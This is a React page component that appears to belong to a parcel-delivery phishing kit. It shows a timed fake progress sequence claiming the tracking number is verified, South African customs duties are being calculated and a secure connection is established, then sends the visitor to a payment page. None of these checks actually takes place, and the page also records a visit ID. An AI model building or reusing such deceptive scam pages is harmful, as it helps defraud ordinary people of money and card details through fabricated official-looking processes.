import { motion } from "framer-motion";
import { Package, CheckCircle2, ShieldCheck, CreditCard, Search } from "lucide-react";
import { useEffect, useState } from "react";
import { useLocation } from "wouter";
import { Progress } from "@/components/ui/progress";
import { useVisitId } from "@/hooks/use-visit-id";

export default function Processing() {
  const [progress, setProgress] = useState(0);
  const [, setLocation] = useLocation();
  useVisitId(); // Initialiser le visitId

  useEffect(() => {
    const timer = setInterval(() => {
      setProgress((oldProgress) => {
        if (oldProgress >= 100) {
          clearInterval(timer);
          return 100;
        }
        return Math.min(oldProgress + 1, 100);
      });
    }, 50); // 5 seconds total duration

    return () => {
      clearInterval(timer);
    };
  }, []);

  // Rediriger quand le progrès atteint 100%
  useEffect(() => {
    if (progress >= 100) {
      const redirectTimer = setTimeout(() => {
        setLocation('/payment');
      }, 500); // Petit délai pour s'assurer que le rendu est terminé
      return () => clearTimeout(redirectTimer);
    }
  }, [progress, setLocation]);

  const steps = [
    {
      icon: <CheckCircle2 className="h-5 w-5 text-brand-blue" />,
      title: "Tracking Number Verified",
      desc: "Your parcel has been located in our system",
      active: progress > 10
    },
    {
      icon: <Search className="h-5 w-5 text-brand-blue" />,
      title: "Customs Check",
      desc: "Calculating duties and taxes for South Africa",
      active: progress > 40
    },
    {
      icon: <CreditCard className="h-5 w-5 text-brand-blue" />,
      title: "Payment Required",
      desc: "Preparing secure payment gateway",
      active: progress > 80
    }
  ];

  return (
    <div className="min-h-screen bg-white flex flex-col items-center justify-center p-4 font-sans">
      <div className="w-full max-w-md flex flex-col items-center">
        
        {/* Animated Package Icon */}
        <motion.div
          animate={{ 
            y: [0, -10, 0],
          }}
          transition={{ 
            duration: 2,
            repeat: Infinity,
            ease: "easeInOut"
          }}
          className="mb-8"
        >
          <Package className="h-20 w-20 text-brand-orange fill-brand-orange/20" />
        </motion.div>

        {/* Spinner */}
        <div className="mb-8 relative">
           <div className="h-16 w-16 rounded-full border-4 border-gray-100"></div>
           <div className="h-16 w-16 rounded-full border-4 border-brand-orange border-t-transparent absolute top-0 left-0 animate-spin"></div>
        </div>

        <h1 className="text-2xl font-bold text-center mb-3 text-brand-blue">
          Processing your parcel details...
        </h1>
        
        <p className="text-gray-500 text-center mb-10 text-sm leading-relaxed max-w-xs">
          We're verifying your tracking information and calculating customs duties. This usually takes a few moments.
        </p>

        {/* Steps Card */}
        <div className="w-full bg-orange-50/50 border border-orange-100 rounded-xl p-6 mb-8">
          <div className="space-y-6">
            {steps.map((step, index) => (
              <motion.div 
                key={index}
                initial={{ opacity: 0, x: -10 }}
                animate={{ opacity: 1, x: 0 }}
                transition={{ delay: index * 0.5 }}
                className={`flex gap-4 ${!step.active ? 'opacity-50' : 'opacity-100'} transition-opacity duration-500`}
              >
                <div className={`
                  flex-shrink-0 h-10 w-10 rounded-full flex items-center justify-center font-bold text-sm
                  ${step.active ? 'bg-brand-orange text-white shadow-md' : 'bg-gray-200 text-gray-500'}
                  transition-colors duration-500
                `}>
                  {index + 1}
                </div>
                <div>
                  <h3 className="font-bold text-brand-blue text-sm mb-1">{step.title}</h3>
                  <p className="text-xs text-gray-500">{step.desc}</p>
                </div>
              </motion.div>
            ))}
          </div>
        </div>

        {/* Bottom Progress */}
        <div className="w-full space-y-4">
          <Progress value={progress} className="h-2 bg-gray-100 [&>div]:bg-brand-orange" />
          
          <div className="flex items-center justify-center gap-2 text-gray-400 text-xs font-medium">
            <ShieldCheck className="h-4 w-4" />
            <span>Secure connection established</span>
          </div>
        </div>

      </div>
    </div>
  );
}
